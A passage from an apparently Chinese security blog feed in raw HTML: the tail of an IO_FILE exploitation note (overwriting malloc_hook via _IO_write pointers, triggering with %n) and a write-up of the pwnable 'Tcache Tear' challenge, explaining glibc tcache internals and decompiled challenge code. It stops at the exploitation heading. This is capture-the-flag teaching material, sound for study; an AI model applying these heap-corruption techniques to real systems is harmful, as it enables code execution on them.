class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br><span class="line">|        malloc_hook       |&lt;----+ _IO_write_base</span><br><span class="line">+--------------------------+</span><br><span class="line">|        malloc_hook       |&lt;----+ _IO_write_ptr</span><br><span class="line">+--------------------------+</span><br><span class="line">|     malooc_hook+ 0x8     |&lt;----+ _IO_write_end</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">|           ...            |</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br><span class="line">|           0x1            |&lt;----+ _fileno</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">|           ...            |</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure></li><li><p>Finally, we can send <code>%n</code> to trigger malloc.</p></li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://xz.aliyun.com/t/5853#toc-4" target="_blank" rel="noopener">IO FILE 之任意读写</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/" target="_blank" rel="noopener">fake-vtable-exploit</a></li><li>[IO FILE 学习笔记]([<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]</a>(<a href="https://veritas501.space/2017/12/13/IO" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO</a> FILE 学习笔记/))</li><li><a href="https://bestwing.me/IO_FILE_Pwn.html" target="_blank" rel="noopener">IO_FILE Pwn 利用整理</a></li><li><a href="http://dittozzz.top/2019/04/24/IO-FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">IO_FILE部分源码分析及利用</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache_tear</title>
      <link href="/writing/Tcache_Tear/"/>
      <url>/writing/Tcache_Tear/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>记录一下<code>pwnable</code>中<code>Tcache Tear</code>的解题过程中利用到的知识和遇到的问题。</p><h2 id="0x02-Tcache"><a href="#0x02-Tcache" class="headerlink" title="0x02 Tcache"></a>0x02 Tcache</h2><p><code>tcache</code>是在<code>glibc-2.26</code>中增加的一种新的内存管理机制，其目的是用于加速malloc分配。它的优先级最高，在内存分配中会得到优先处理。由于它的加入使得现在的内存分配、回收与之前有了一定的区别，同时也产生了一些新的安全问题。</p><h3 id="总体框架"><a href="#总体框架" class="headerlink" title="总体框架"></a>总体框架</h3><p>从源码中的宏定义中可以看出，<code>tcache</code>结构中总共有64个<code>bin</code>，其中每个<code>bin</code>中最多含有7个<code>chunk</code>。其可容纳的最大内存块为<code>1032 bytes</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><code>tcache</code>定义了两个新的结构，<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p><p><code>tcache_perthread_struct</code>是每个线程中<code>tcache</code>的主体。其中<code>counts</code>用于记录每个<code>bin</code>中含有的<code>chunk</code>个数，<code>entries</code>用于记录每个<code>idx</code>中的第一个<code>chunk</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>tcache</code>由<code>tcache_put()</code>和<code>cache_get()</code>两个函数来分别完成其放入、移出操作。其实现细节和<code>fastbin</code>很相似。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出<code>tcache_put()</code>的操作如下：</p><ul><li>首先检验准备放入的<code>chunk</code>大小是否小于<code>tcache</code>所容纳的最大<code>chunk</code>大小。</li><li>若大小满足，完成相应的链表操作。将对应的<code>chunk</code>放入一个位置即入口位置。</li><li>增加相应<code>bin</code>的数目</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出<code>tcache_ge t()</code>的操作如下：</p><ul><li>首先检验所需<code>chunk</code>大小是否满足、再检验对应的<code>bin</code>中是否有<code>chunk</code>剩余</li><li>若有<code>chunk</code>，将其取出更新入口地址</li><li>返回对应的<code>chunk</code></li></ul><h3 id="堆管理的细节"><a href="#堆管理的细节" class="headerlink" title="堆管理的细节"></a>堆管理的细节</h3><h4 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h4><p><code>__libc_malloc()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到在进行堆分配的时候，首先检查<code>tcache</code>中是否存在满足的<code>chunk</code>，若有则从中取出相应的<code>chunk</code>并返回，否则，通过<code>_int_malloc()</code>来完成相应的内存的分配操作。</p><p><code>_int_malloc()</code></p><p>在<code>_int_malloc()</code>进行内存分配的时候，有多处会将<code>chunk</code>移入<code>tcache</code>中：</p><ul><li><p>从<code>fastbin</code>分配出合适的<code>chunk</code>之后，<code>fastbin</code>中该<code>chunk</code>所在的<code>bin</code>的其余<code>chunks</code>会放入<code>tcache</code>中，直到对应的<code>tcache bin</code>放满。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  </span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (pp = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>同样的，从<code>smallbin</code>中分配出合适的<code>chunk</code>之后，也会执行相应的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>在遍历<code>unsorted_bin</code>寻找合适<code>chunk</code>时：</p><ul><li>当找到大小合适的<code>chunk</code>时，并不直接返回，而是先放到tcache中，并且设置<code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code>，继续处理。</li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">size</span> == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span>  </span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="comment">/* 遍历 unsorted bin的最后，会根据 return_cached判断是否有 大小适配的 unsorted bin 进入了 tcache ， 由于 mp_.tcache_unsorted_limit默认为 0 ，所以不会进入分支。 */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> <span class="comment">// 遍历完unsorted bin之后，若有合适的chunk则从中返回一个chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li></ul><h4 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h4><p><code>_int_free()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">size</span> = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>); </span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>首先获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就检查<code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样处理。</li></ul><h2 id="0x03-Tcache-Tear"><a href="#0x03-Tcache-Tear" class="headerlink" title="0x03 Tcache_Tear"></a>0x03 Tcache_Tear</h2><h3 id="程序功能描述"><a href="#程序功能描述" class="headerlink" title="程序功能描述"></a>程序功能描述</h3><p>程序有三个功能：<code>malloc</code>, <code>free</code>, <code>info</code></p><ul><li><p><code>malloc_chunk()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc_chunk</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> sizea; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  result = (<span class="keyword">void</span> *)read_size();</span><br><span class="line">  sizea = (<span class="keyword">signed</span> <span class="keyword">int</span>)result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)result &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>((<span class="keyword">size_t</span>)result);  <span class="comment">//ptr at .bss:0000000000602088</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">    sub_400A25((__int64)ptr, sizea - <span class="number">16</span>);</span><br><span class="line">    LODWORD(result) = <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>sub_400A25()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400A25</span><span class="params">(__int64 ptr, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __read_chk(<span class="number">0L</span>L, ptr, len, len);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int8 *)(v3 - <span class="number">1L</span>L + ptr);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3 - <span class="number">1L</span>L + ptr;</span><br><span class="line">    *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure></li><li><p><code>free()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptr;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure></li><li><p><code>info()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name :"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">write</span>(<span class="number">1</span>, &amp;name_ptr, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="漏洞分析及利用"><a href="#漏洞分析及利用" class="headerlink" 